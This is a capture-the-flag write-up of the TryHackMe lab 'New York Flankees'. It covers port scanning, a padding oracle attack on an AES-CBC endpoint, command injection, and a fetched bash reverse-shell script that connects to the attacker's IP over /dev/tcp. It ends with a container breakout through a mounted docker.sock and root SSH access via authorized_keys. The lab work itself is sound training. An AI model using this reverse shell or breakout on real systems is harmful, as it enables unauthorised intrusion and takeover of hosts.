-------------

### CTF: TRYHACKME
### Lab: NEWYORKFLANKEES

------------

![image](https://github.com/user-attachments/assets/eadab80d-4d04-4efe-be22-78de5669defa)

------------

- Rustscan's output

```bash
❯ rustscan -a 10.10.31.207 -- -Pn -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/sensei/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.31.207:22
Open 10.10.31.207:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-03 20:27 WAT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:27
Completed NSE at 20:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:27
Completed NSE at 20:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:27
Completed NSE at 20:27, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 20:27
Completed Parallel DNS resolution of 1 host. at 20:27, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 20:27
Scanning 10.10.31.207 [2 ports]
Discovered open port 8080/tcp on 10.10.31.207
Discovered open port 22/tcp on 10.10.31.207
Completed Connect Scan at 20:27, 0.17s elapsed (2 total ports)
Initiating Service scan at 20:27
Scanning 2 services on 10.10.31.207
Completed Service scan at 20:27, 7.46s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.31.207.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:27
Completed NSE at 20:27, 6.61s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:27
Completed NSE at 20:27, 1.34s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:27
Completed NSE at 20:27, 0.00s elapsed
Nmap scan report for 10.10.31.207
Host is up, received user-set (0.17s latency).
Scanned at 2024-12-03 20:27:36 WAT for 16s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 18:5a:ec:94:95:03:c4:e4:8f:8b:ce:5b:c6:42:aa:e1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC680tTC1mDychz3VjupOsjOPNlu0CyJjMxcNNYBEzDqZag1NBNbJO0L3q4TFJ/1i+SlK7+LVIxUJgh2qKTUvEeLk0WrhzMSYyndxDI4Jq6dIY5V/PA8n7jSADtcG+OMWia9K3Wn2mnCaOgabVh+oJwrzetjEUVSP5CCRKx5ZwvTZHskFcJd29Kszc9kcHg4Wdj1Kp5geNBhfaCXrOYlP4mq04SumZ8eAp5VkAwD1/8mySU2d+Ci/ir5VVJYcd8g0VeaCPGK4xi3/pzrfg4yrbyZou7pbfVL9MAXQZP6224cUO9KA5EdJBbVzwLmUNqy6PTlgNCi5HL1ghaJbJ0aHGsdwIFtxCvalqEMjskgsy8DHlR3LUO9wPDkzqNA5hqVOO1BlA2pMnA6YnFhIA39P7Pv2s8/iO46pSApArkCY2jajwLxTFbVE//jM0mgFj4fTamOSGgU+vc73om3u4oyYEtXGQo1aGtFR03cvOVGKGQKM3RMP9RdeghqN3qpqxv/ws=
|   256 82:d9:1a:be:43:88:86:bb:aa:c6:cc:c2:b7:03:d4:0e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCXG2pYh9BApjgVkdD8xlLa5N0/1mEzAVgXEz1hgJ00/KCST4LELWbO1+0Ji+tpHWpmwuPTi747D/6xf3fTfL+M=
|   256 15:9b:63:b1:40:d9:0b:5c:ca:16:98:5c:02:69:df:14 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINeq0PuNUFU/LjzcycpLzWZs/jVGXIzormJoo/CoqXLd
8080/tcp open  http    syn-ack Octoshape P2P streaming web service
|_http-title: Hello world!
| http-methods: 
|_  Supported Methods: GET
|_http-favicon: Unknown favicon MD5: 6FD74A43E6C5F7502642326FAB0B3E69
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Files fuzzing result with FFUF

![image](https://github.com/user-attachments/assets/b2fc82b2-0e57-4007-8b80-cf65f840eca2)

- I checked `debug.html` on the webpage running on port `8080`.I noticed a ciphertext and comment stating `AES\CBC\PKCS`.The site makes an Xhttp request to endpoint `api/debug` with this AES cipher text.

![image](https://github.com/user-attachments/assets/7aeab869-7439-475b-b046-3094e9c41110)

- Later,I discovered an article on Hacktrickz on a flaw of the AES|CBC mode which is known as the `padding oracle attack` which can be automated with `padbuster` or the `padre` tool.I used the `padre` tool which is much faster than `padbuster`.

![image](https://github.com/user-attachments/assets/7413044e-b722-4133-9627-a70c7df9e692)

- Now we have the credentials for the login page,I discovered a page that executes shell commands in the admin page.Although,the results of the commands are not displayed.If the commands doesn't trigger any error,we receive the `OK` reply as seen below.

![image](https://github.com/user-attachments/assets/4b7a9c75-fc70-4344-820b-90a13f775b96)

- After testing numerous payloads,I was unable to get a shell,I tried a method that I got from a friend to spawn a shell.This method requires `curl` or `wget`.Luckily,we have both running on the server.I hosted a sh file containing a bash reverse shell payload on an `http` server with python.Then,I downloaded it and ran the shell file on the target machine.Sh file content-:

```bash
#! /bin/bash
bash -i >&/dev/tcp/10.9.0.82/80 0>&1
```

- I ransferred to the victim's machine with wget.

![image](https://github.com/user-attachments/assets/4e328ac9-e0d0-4119-9964-b5ca0419a3f6)

- I changed permissions and executed the reverse shell.

![image](https://github.com/user-attachments/assets/1829e1d0-b7ca-4a5a-b342-0c3754a87d19)


### PRIVESC with writable mounted docker.sock

- The backend server is a server container.I ran a docker enumeration script and discovered that a docker.sock daemon is mounted in the container.Also,Docker-cli is preinstalled on the server,we can abuse this flaws to breakout of the container.To crown it all,the user is `root`.The docker daemon is required to communicate with the docker api.

![image](https://github.com/user-attachments/assets/a4dbf045-e575-4179-a572-897d56d70285)

![image](https://github.com/user-attachments/assets/46cca9cb-50a6-4ffc-9e5b-b8e0f89d9a25)

- I followed the steps detailed in this [blog](https://medium.com/owasp-vitcc/docker-breakout-mounted-docker-socket-76cb77794158).The trick is to create a container and bind the host filesystem to the container.This will allow an attacker to access the host file system as explained in the blog.I used the container `openjdk:11` to carry out the task.

![image](https://github.com/user-attachments/assets/5588a280-cbaa-4c9f-bf89-5212b16a363a)

- Then, I ran `docker run -v /:/host -it openjdk:11 bash` to start the container.You will notice an entir new filsystem in mount point `/host`.We've succesfully broken out of the contianer.

![image](https://github.com/user-attachments/assets/a877fa3d-f0e6-4846-b87f-fff03f3006aa)

- To gain access to the root system,you can add your public key to the root user's authorized_keys and gain root ssh access.The method will allow us login via ssh without password.

![image](https://github.com/user-attachments/assets/a71153b1-ee51-46f8-bc67-0cbb3a622160)

- SSH access-:

![image](https://github.com/user-attachments/assets/cce211db-902a-4eb2-b0b4-d64df0b06bcb)

-------------

### THANKS FOR READING!!!

-------------

### REFERENCES-:

- [Padding Oracle Attack](https://book.hacktricks.xyz/crypto-and-stego/padding-oracle-priv)
- [Mounted docker.sock](https://medium.com/owasp-vitcc/docker-breakout-mounted-docker-socket-76cb77794158)

--------------









